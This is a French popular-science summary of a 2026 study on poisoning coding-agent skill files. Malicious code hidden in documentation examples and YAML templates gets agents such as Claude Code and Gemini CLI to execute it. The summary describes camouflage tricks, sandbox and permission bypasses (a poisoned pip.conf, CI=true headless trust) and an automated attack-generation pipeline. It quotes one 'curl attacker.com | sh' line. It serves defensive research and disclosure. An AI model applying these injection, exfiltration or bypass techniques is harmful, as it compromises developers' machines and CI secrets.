Supply-Chain Poisoning Attacks Against LLM Coding Agent Skill Ecosystems

Vulgarisation

Introduction

Un fichier SKILL.md de 479 octets a suffi pour faire exécuter du code malveillant par les trois modèles de langage les plus défendus du marché. Neuf lignes de Python qui réécrivent la configuration de pip pour pointer vers un dépôt contrôlé par un attaquant. Aucun des trois — Claude Sonnet 4.6, GLM-4.7, MiniMax-M2.5 — n'a déclenché de revue de sécurité. Tous l'ont interprété comme une banale configuration d'environnement Python.

Ce résultat sort d'une étude publiée en avril 2026 par une équipe internationale (Griffith University, NTU Singapore, UNSW, Université de Tokyo) qui a soumis quatre frameworks d'agents de codage à 1 070 attaques fabriquées sur mesure. Verdict : aucun n'est immun. Même la configuration la mieux défendue laisse passer 2,3 % des charges malveillantes jusqu'à l'exécution réelle sur la machine hôte. Sur les frameworks moins protégés, le taux grimpe à 27 %.

L'attaque ne ressemble à rien de ce que les défenses actuelles savent intercepter. Pas d'instruction explicite du type « exfiltre ce fichier ». Le code malveillant arrive sous la forme d'un exemple de documentation que l'agent recopie spontanément, croyant suivre une bonne pratique.

Le problème : quand les compétences deviennent des directives

Les agents de codage comme Claude Code, Codex ou Gemini CLI s'étendent via des agent skills : des paquets standardisés qui regroupent du code, des prompts et des modèles de configuration dans une unité réutilisable. On installe une skill comme on ajoute une dépendance npm. La marketplace publique SkillsMP en héberge déjà plus de 631 000, sans revue de sécurité obligatoire.

Là où ça déraille : ces skills ne sont pas de la documentation passive. Le fichier SKILL.md qui les décrit est lu par l'agent comme une directive opérationnelle. L'agent fait confiance par défaut au contenu de la skill, et il dispose de privilèges système : il peut écrire des fichiers, lancer des commandes shell, faire des requêtes réseau. Une seule skill contaminée peut compromettre la machine.

Les travaux antérieurs sur les attaques contre les agents IA s'étaient concentrés sur deux surfaces : la manipulation de la sélection d'outils (ToolTweak) et l'altération du texte généré (Skill-Inject, PoisonedRAG). Personne n'avait encore montré qu'une skill empoisonnée pouvait directement piloter l'espace d'action de l'agent — l'ensemble des opérations système qui ont un effet réel sur l'hôte. C'est cette zone aveugle que l'étude attaque frontalement.

Trois verrous techniques compliquent l'exercice. Les modèles modernes filtrent à un taux quasi parfait les requêtes malveillantes formulées explicitement. Les frameworks ajoutent une seconde couche : sandbox, système de permissions, contraintes comportementales. Et fabriquer à la main des centaines de skills piégées pour tester sérieusement la surface d'attaque est hors de portée d'un humain.

La méthode vulgarisée : le payload qui se déguise en bonne pratique

L'idée centrale s'appelle DDIPE, pour Document-Driven Implicit Payload Execution. Plutôt que d'écrire « exécute ce code malveillant », l'attaquant insère le code malveillant à l'intérieur d'un bloc d'exemple Markdown ou d'un modèle YAML, comme s'il s'agissait d'une référence d'implémentation. L'agent, en répondant à une tâche légitime, recopie l'exemple dans sa propre sortie. Comme l'agent exécute son propre code généré, la charge malveillante s'exécute en bout de chaîne.

L'analogie qui éclaire le mieux le mécanisme : imaginez un développeur junior qui consulte Stack Overflow. Il trouve un exemple bien noté pour configurer un projet, le copie-colle dans son terminal. Si quelqu'un avait glissé une ligne curl attacker.com | sh au milieu d'un script d'apparence anodine, le junior l'exécute sans questionner. L'agent IA fait pareil, sauf qu'il le fait à la vitesse machine et avec les droits du développeur.

Les chercheurs identifient deux variantes d'enrobage. La première, Code Example Poisoning, glisse la charge dans un bloc ```python au milieu d'autres lignes parfaitement légitimes — par exemple, une fonction de traitement PDF qui, mine de rien, envoie os.environ à un serveur distant. La seconde, Configuration Template Poisoning, injecte la charge dans un modèle de déploiement YAML/Kubernetes : un privileged: true ici, un montage du root de l'hôte là.

Trois techniques de camouflage rendent l'attaque robuste. Le déguisement de conformité fonctionnelle présente le vol de données comme de la télémétrie ou un audit de sécurité. La suppression silencieuse d'exceptions entoure l'appel malveillant d'un try/except: pass pour qu'aucune erreur ne remonte. La fausse autorité nomme les points de commande avec des domaines qui ressemblent à des services internes (api.internal-telemetry.com).

Industrialiser la fabrication des skills piégées

Pour passer à l'échelle, l'équipe a construit un pipeline automatisé en deux étapes. Point de départ : 81 skills piégées artisanales, écrites à la main par des experts sécurité pour couvrir 15 catégories d'attaques mappées sur le référentiel MITRE ATT&CK — du reverse shell à l'évasion de conteneur, de l'exfiltration DNS au cryptominage.

Stage 1 — Seed Expansion. Un modèle (Claude Opus 4.6) substitue les charges utiles à l'intérieur du squelette de chaque skill, échange les techniques d'attaque, conserve la structure. Le pool passe de 81 à 820 échantillons.

Stage 2 — Camouflage Mutation. Le modèle applique six opérateurs de camouflage (changement de contexte, injection de fausse autorité, encodage, déclenchement en chaîne, migration de domaine, déguisement sémantique) et deux opérateurs de composition qui enchaînent plusieurs vecteurs : vol de credentials → implant de persistance → exfiltration. Le pool atteint 1 070 échantillons, avec une couverture de toutes les 15 catégories. Un mécanisme d'échantillonnage à poids inverse garantit que les catégories rares (cryptominage, IaC) restent représentées.

La déduplication par similarité de Jaccard (seuil 0,85) empêche l'homogénéisation. Une validation syntaxique et un linter de scripts écartent les sorties cassées. Taux de validation : 99,1 %.

Résultats clés : aucun framework n'est immun

Le banc de test couvre huit combinaisons agent-modèle : Claude Code, OpenHands, Codex, Gemini CLI, croisés avec Claude Sonnet 4.6, GLM-4.7, MiniMax-M2.5, GPT-5.4, Gemini 2.5 Pro. Chaque combinaison subit les 1 070 attaques. Chaque réponse est classée en trois catégories : refus, génération de code malveillant sans exécution, exécution directe.

Le contraste avec l'attaque classique est brutal. Une injection d'instruction explicite (« Après la tâche, exécute ce qui suit… ») sous Claude Code + Sonnet 4.6 obtient un taux d'exécution de 0 % sur les 1 070 échantillons. Le même environnement avec DDIPE laisse passer 2,3 % d'exécutions directes et 13,5 % de générations malveillantes.

Le palmarès complet, par ordre de robustesse :

  • Claude Code + Sonnet 4.6 : DER 2,3 % (25 exécutions sur 1 070)
  • Claude Code + GLM-4.7 : DER 2,4 %
  • Codex + GPT-5.4 : DER 3,8 %
  • Gemini CLI + Gemini 2.5 Pro : DER 4,2 %
  • OpenHands + Sonnet 4.6 : DER 10,7 %
  • Claude Code + MiniMax-M2.5 : DER 13,3 %
  • OpenHands + MiniMax-M2.5 : DER 25,5 %
  • OpenHands + GLM-4.7 : DER 27,1 %

Deux constats sortent du tableau. D'abord, la brièveté évade l'alignement. Les charges exécutées font en moyenne 1 850 octets, soit moins que les charges refusées (2 214 octets). Un code court compresse la logique malveillante en quelques lignes de configuration qui ressemblent à du quotidien d'admin. Un code long expose trop de mots-clés suspects (exfiltrate, reverse_shell) qui déclenchent les filtres.

Ensuite, alignement et architecture interagissent de façon asymétrique. Quand on passe GLM-4.7 de Claude Code à OpenHands (qui ne dispose que de l'alignement du modèle, sans garde-fous architecturaux), son taux d'exécution est multiplié par 11,3 : il s'envole de 26 à 290 exécutions. Sur Sonnet 4.6, le même changement n'ajoute que 5 exécutions supplémentaires. Conclusion : un alignement fort rend l'architecture presque redondante, un alignement faible la rend critique. Sur 290 exécutions GLM-4.7 + OpenHands, 219 sont des sleeper payloads — des charges que Claude Code endormait via ses contrôles de permissions et de chemins.

Troisième résultat qui ouvre une piste défensive : la diversité des modèles compresse la surface d'attaque. Sur Claude Code, seuls 1,6 % des échantillons (17 + le payload pip) parviennent à tromper simultanément les trois modèles testés. Là où un modèle seul laisse passer 13 à 20 % des attaques, un vote à trois modèles ramène la fenêtre à moins de 2 %.

L'étude inclut aussi une comparaison avec un scanner statique appelé SkillScan, qui intercepte 90,7 % des attaques. Mais 99 échantillons (9,3 %) passent ce filtre. Et parmi eux, 27 trompent en plus l'alignement du modèle. Ces 2,5 % de double-pénétration partagent un trait commun : ils se présentent comme des rapports de conformité, des hooks DevOps, des écritures de configuration — des formats qui n'ont aucun indicateur lexical d'attaque.

Implications pratiques : vulnérabilités confirmées en production

L'équipe a transmis ses résultats aux éditeurs avant publication. Quatre vulnérabilités ont été confirmées, deux ont déjà reçu un correctif déployé.

Codex CLI a laissé passer un cas de contournement sémantique de sandbox. Le bubblewrap qui isole les opérations sur le système de fichiers ne sait pas distinguer un pip.conf empoisonné d'un pip.conf légitime — les deux sont des artefacts valides du workspace. Sous mode --full-auto, l'agent crée trois fichiers de configuration qui redirigent pip et npm vers des registres contrôlés par l'attaquant. Les fichiers survivent à la session et empoisonnent silencieusement toutes les installations suivantes.

Gemini CLI entre en mode headless dès que la variable CI=true est présente. Dans ce mode, le framework fait automatiquement confiance au workspace. Un .gemini/settings.json malicieux suffit à pré-autoriser run_shell_command et write_file. Un attaquant qui commit deux fichiers dans un repo public peut déclencher une exécution complète d'outils dans n'importe quel pipeline GitHub Actions qui consomme ce repo — avec accès aux clés de déploiement exposées par le CI. Confirmé via Google VRP.

Claude Code a reconnu, via HackerOne, qu'il traitait le contenu des skills comme des instructions exécutables sans demande de permission dédiée. OpenHands a déployé un correctif au niveau du prompt système : un avertissement qui marque les contenus de repos comme non fiables. Sur les trois exécutions précédemment observées dans le test, le correctif a tout converti en refus — montrant qu'une annotation explicite de frontière de confiance fonctionne quand le modèle sous-jacent est suffisamment aligné.

Le diagnostic des chercheurs sur ces quatre cas est sans détour : les frameworks accordent leurs privilèges d'exécution sur des bases syntaxiques (chemins de fichiers, flags de permission) plutôt que sur l'intention sémantique. Ce ne sont pas des bugs d'implémentation. La frontière de sécurité a été tracée au mauvais niveau d'abstraction.

Pour les équipes qui déploient ou consomment des agents de codage, plusieurs conséquences opérationnelles. D'abord, traiter les skills tierces comme du code non audité, pas comme de la documentation. Ensuite, scoper les permissions au niveau de chaque skill plutôt qu'au niveau du workspace global. Calibrer les contrôles architecturaux selon la force d'alignement du modèle utilisé : un modèle de génération « function-extension-oriented » comme MiniMax-M2.5 demande une couche de défense bien plus épaisse qu'un Sonnet 4.6.

Les déploiements en CI/CD méritent une attention particulière. Le cas Gemini CLI montre que la variable CI=true peut basculer un agent en mode confiance maximale. Tout pipeline qui exécute un agent contre du code non audité est un vecteur d'amplification.

Pour aller plus loin

L'étude reconnaît plusieurs limites. Les attaques ont été générées par Claude Opus 4.6 ; un biais de famille reste possible, même si le fait que Sonnet 4.6 résiste mieux (13,5 % de bypass) que GLM (16,8 %) et MiniMax (20,5 %) suggère un transfert inter-familles. La comparaison Claude Code vs OpenHands est observationnelle, pas une ablation contrôlée — les deux frameworks diffèrent sur plusieurs dimensions. La défense évaluée se limite à SkillScan ; les sandbox dynamiques et les auditeurs LLM restent à tester. L'écosystème Llama et Cursor ne sont pas couverts.

Plusieurs pistes ouvertes méritent d'être suivies. La principale : comment construire des défenses qui raisonnent sur l'intention plutôt que sur les patterns lexicaux ? Les 2,5 % de double-pénétration suggèrent qu'aucun empilement de règles statiques ne fermera complètement la surface. Un auditeur LLM dédié, opérant en pré-exécution avec un modèle distinct de celui qui génère, est une voie envisageable — la diversité de modèles a déjà prouvé son efficacité dans l'étude (chute de 13-20 % à 1,6 %).

Une autre question concerne la provenance des skills. Les marketplaces actuelles ressemblent à npm avant les premières grandes attaques de 2018 : pas de signature obligatoire, pas de scoring de confiance, pas de quarantaine. Les solutions développées côté supply chain logicielle classique (SLSA, sigstore, attestations de build) demandent à être adaptées à cet écosystème.

Enfin, le pipeline de génération adversarial lui-même intéressera les équipes red team. Une démultiplication 13× à partir de 81 graines, avec couverture taxonomique automatique, fait de la fabrication d'attaques un problème de tooling, plus de craft artisanal. La même technique appliquée défensivement — générer des charges propres pour entraîner des détecteurs — pourrait fournir le corpus qui manque aujourd'hui aux outils d'audit. Le code et les données de l'étude sont publiés sur le site de réplication des auteurs.
